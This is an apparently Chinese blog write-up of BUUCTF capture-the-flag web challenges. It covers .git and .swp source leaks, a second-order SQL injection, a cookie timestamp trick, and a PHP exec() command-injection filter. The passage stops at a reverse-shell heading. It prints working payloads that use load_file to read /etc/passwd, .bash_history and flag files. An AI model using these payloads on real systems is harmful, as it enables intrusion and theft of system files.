@@ -1,0 +1,587 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF17 | Tcy👦♥QQ👧</title><meta name="keywords" content="sql二次注入,.git泄露,swp信息泄露,命令执行-反弹shell,PHP中$_SERVER的详细参数与说明介绍,正则表达式污染+basename函数特性"><meta name="author" content="uploads"><meta name="copyright" content="uploads"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="[网鼎杯 2018]Comment 暴力破解​     一般后面都是数字！ 但是我都爆破了！ 429 还是只爆破数字把🙄  666 .git泄露 python2 git_extract.py http:&#x2F;&#x2F;6d4ef7d1-a3dc-4e56-a6a4-b0995f700308.node3.buuoj.cn&#x2F;index.php&#x2F;.git&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF17">
+<meta property="og:url" content="https://tanchiyu.top/2021/01/26/BUUCTF-17/index.html">
+<meta property="og:site_name" content="Tcy👦♥QQ👧">
+<meta property="og:description" content="[网鼎杯 2018]Comment 暴力破解​     一般后面都是数字！ 但是我都爆破了！ 429 还是只爆破数字把🙄  666 .git泄露 python2 git_extract.py http:&#x2F;&#x2F;6d4ef7d1-a3dc-4e56-a6a4-b0995f700308.node3.buuoj.cn&#x2F;index.php&#x2F;.git&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tanchiyu.top/image/ttt.jpg">
+<meta property="article:published_time" content="2021-01-26T02:34:33.000Z">
+<meta property="article:modified_time" content="2021-01-27T12:53:20.500Z">
+<meta property="article:author" content="uploads">
+<meta property="article:tag" content="sql二次注入">
+<meta property="article:tag" content=".git泄露">
+<meta property="article:tag" content="swp信息泄露">
+<meta property="article:tag" content="命令执行-反弹shell">
+<meta property="article:tag" content="PHP中$_SERVER的详细参数与说明介绍">
+<meta property="article:tag" content="正则表达式污染+basename函数特性">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tanchiyu.top/image/ttt.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="https://tanchiyu.top/2021/01/26/BUUCTF-17/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-27 20:53:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tcy👦♥QQ👧" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tcy👦♥QQ👧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF17</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-26T02:34:33.000Z" title="发表于 2021-01-26 10:34:33">2021-01-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-27T12:53:20.500Z" title="更新于 2021-01-27 20:53:20">2021-01-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154559.png" alt="image-20210126103618701"></p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>​    <img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154600.png" alt="image-20210126110242117"></p>
+<p>一般后面都是数字！</p>
+<p>但是我都爆破了！</p>
+<p>429</p>
+<p>还是只爆破数字把🙄</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154601.png" alt="image-20210126110649209"></p>
+<p>666</p>
+<h2 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154602.png" alt="image-20210126111536142"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 git_extract.py http:&#x2F;&#x2F;6d4ef7d1-a3dc-4e56-a6a4-b0995f700308.node3.buuoj.cn&#x2F;index.php&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>有个师傅讲git</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamstudy&#x2F;articles&#x2F;wangding_4th_game_web_writeup.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>还是之前那句话！无论前端输入的是啥！</p>
+<p>都把他当成字符串！最后只在数据库里起作用！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154603.png" alt="image-20210126120153822"></p>
+<p>看上面的单引号！会被转义(addslashes() 函数的作用)！最后放到数据库里就还原了！</p>
+<p>反正前端输入啥到数据库就是啥！有时候一些特殊字符要url编码！# –》%23</p>
+<p>到了数据库按照数据库的语言来执行了！比如注释 转义什么的！#就变成了sql注释</p>
+<p>看这个题：</p>
+<p>里面有board  comment两个表！</p>
+<p>board 表里传入数据！ 如果我们传入sql语句！构造一下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;user(),&#x2F;* </span><br></pre></td></tr></table></figure>
+
+<p> (刚刚上面说了！就把它当成字符串传入！具体前端咋传的咱不管！)</p>
+<p>这个数据传入board  表里是正常的！但是在插入comment表里时！会被当成sql语句执行！</p>
+<p>这就二次注入！</p>
+<p>comment表里content字段我们可控！所以：</p>
+<p>我们可以构造：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154604.png" alt="image-20210126125144698"></p>
+<p>哦哦：！还有：</p>
+<h3 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes() 函数"></a>addslashes() 函数</h3><p>这里他有个addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<p>有了也没关系</p>
+<p>sql语句会转义</p>
+<p>插入board就是正常的数据！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into board set category &#x3D; &#39;\&#39;,content&#x3D;user(),&#x2F;*&#39;, title &#x3D; &#39;dada&#39;, content &#x3D; &#39;adada&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终在数据里转义存在board表里的还是’,content=user(),/*</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://mochazz.github.io/img/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/5.png" alt="5"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154605.png" alt="image-20210126125620269"></p>
+<p>等会我发现不转义！</p>
+<p>数据库还插不进去！会报错！所以这里必须有个转义才能才能插入board表！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154606.png" alt="image-20210126131139340"></p>
+<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;user(),&#x2F;*</span><br><span class="line">*&#x2F;#;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行成功😁</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154607.png" alt="image-20210126121842457"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)),&#x2F;*</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="etc-passwd-文件格式："><a href="#etc-passwd-文件格式：" class="headerlink" title="/etc/passwd 文件格式："></a>/etc/passwd 文件格式：</h3><p>passwd 格式</p>
+<p>/etc/passwd 中<br><strong>一行记录</strong>对应着一个用户。<br>每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p>
+<p><strong>用户名</strong>:<strong>口令</strong>:<strong>用户标识号</strong>:<strong>组标识号</strong>:<strong>注释性描述</strong>:<strong>主目录</strong>:<strong>登录Shell</strong></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154608.png" alt="image-20210126125457273"></p>
+<h3 id="bash-history文件"><a href="#bash-history文件" class="headerlink" title=".bash_history文件"></a><code>.bash_history</code>文件</h3><p>我们linux里每个用户的根目录都有一个<code>.bash_history</code>文件,</p>
+<p>用途: 保存了当前用户使用过的历史命令,方便查找</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154609.png" alt="image-20210126122609152"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;)),&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154610.png" alt="image-20210126130320358"></p>
+<h3 id="DS-Store-泄露"><a href="#DS-Store-泄露" class="headerlink" title=".DS_Store 泄露"></a>.DS_Store 泄露</h3><p>.DS_Store (英文全称Desktop Services Store) 是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的圖標位置或者是背景色的选择。 该文件由Finder创建并维护，类似于Microsoft Windows中的desktop.ini文件。</p>
+<p>.DS_Store就是里面记录的目录的信息！</p>
+<p>发现/tmp/下html目录没有删除！</p>
+<p>看看里面的.DS_Store </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</span><br><span class="line">啥也看不懂</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br><span class="line"></span><br><span class="line">&#39;,content&#x3D;(select ascii(load_file(&#39;&#x2F;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ASCII 在线转换：</p>
+<p><a target="_blank" rel="noopener" href="http://www.ab126.com/goju/1711.html">http://www.ab126.com/goju/1711.html</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.l.a.g._.8.9.4.6.e.1.f.f.1.e.e.3.e.4.0.f...p.h.p</span><br><span class="line"></span><br><span class="line">flag_8946e1ff1ee3e40f.php</span><br><span class="line"></span><br><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;)),&#x2F;*</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="sql语句注释问题"><a href="#sql语句注释问题" class="headerlink" title="sql语句注释问题"></a>sql语句注释问题</h3><p>最后因为自己tcl！发现个问题：</p>
+<p>为啥要</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;user(),&#x2F;* 里user()后面要加逗号！</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里又要讲下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sql语句的单行注释和多行注释！！！</span><br><span class="line">出题人太细了！！！😶</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154611.png" alt="image-20210126141618094"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有,号发现单号注释最后的pass还是写入了！ 但是如果没有,号  语句就运行不了！</span><br><span class="line">题目还有个bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">所以必须要有逗号！！！😶😶😶</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154612.png" alt="image-20210126154848419"></p>
+<p>啥东西！爆破！！！</p>
+<p>太脑洞！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;test.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问test.php也没啥用！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发现cookie里dXNlcg&#x3D;MTYxMTY0NzY5Ng%3D%3D</span><br><span class="line">是时间戳</span><br><span class="line">把他的值调0就可以了！</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h1><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210127154613.png" alt="image-20210126161302441"></p>
+<p>swp泄露</p>
+<p>[CTF之信息泄漏]:</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hydraxx/p/10762512.html">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>
+<p>index.php.swp</p>
+<p>.index.php.swp</p>
+<p>像.swp文件，就是vim源文件泄漏，/.index.php.swp或/index.php~ 可以直接用vim -r inde.php来读取文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>【PHP】之4个反斜杠、3个反斜杠的情况:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41463193/article/details/83539168">https://blog.csdn.net/weixin_41463193/article/details/83539168</a></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>可以发现有个命令执行！</p>
+<p>直接反弹shell</p>
